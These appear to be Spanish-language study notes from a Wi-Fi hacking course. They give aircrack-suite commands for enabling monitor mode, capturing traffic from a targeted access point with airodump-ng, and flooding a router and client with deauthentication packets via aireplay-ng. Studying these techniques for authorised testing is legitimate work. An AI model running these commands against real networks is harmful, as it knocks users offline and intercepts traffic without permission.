# Pre Connection Attacks

## Modo monitor

### Configuración

1. Deshabilitar interfaz

```bash
ifconfig <interfaz de red> down
ifconfig wlan0 down
```

2. Matar procesos que puedan interferir con el modo monitor

`airmon-ng check kill`

3. Habilitar modo monitor

```bash
iwconfig <interfaz de red> mode monitor
iwconfig wlan0 mode monitor
```

4. Habilitar interfaz

```bash
ifconfig <interfaz de red> up
ifconfig wlan0 up
```

5. Comprobar que al ejecutar `iwconfig` el modo aparezca como `Mode:Monitor`

### Explicación

TODO: Lectura 13 de [Learn Network Hacking From Scratch (WIFI & Wired)](https://www.udemy.com/course/wifi-hacking-penetration-testing-from-scratch/learn/lecture/)

## Packet Sniffing

*Verificar que la interfaz se encuentre en modo monitor*

### airodump-ng

```bash
airodump-ng <interfaz en modo monitor>
airodump-ng mon0
```

#### 5GHz

```bash
airodump-ng --band a <interfaz en modo monitor>
airodump-ng --band a mon0
```

```bash
airodump-ng --band abg <interfaz en modo monitor> ## abg indica que se se quiere capturar tanto 2.4 GHz como 5GHz
airodump-ng --band abg mon0
```

*Se requiere una tarjeta de red decente y tener en mente que puede ejecutarse con más lentitud*

#### Ejecutando a objetivo

```bash
airodump-ng --bssid <BSSID> --channel <canal> --write <nombre de archivo> <interfaz en modo monitor>
airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write file mon0
```

## Deauthentication Attack

### Explicación

TODO: Lectura 17 de [Learn Network Hacking From Scratch (WIFI & Wired)](https://www.udemy.com/course/wifi-hacking-penetration-testing-from-scratch/learn/lecture/)

### Ejecución

```bash
aireplay-ng --deauth <cantidad de paquetes a enviar> -a <MAC Address router> -c <MAC Address cliente> <interfaz en modo monitor>
aireplay-ng --deauth 10000000 -a F8:23:B2:B9:50:A8 -c 80:E6:50:22:A2:E8 mon0
```
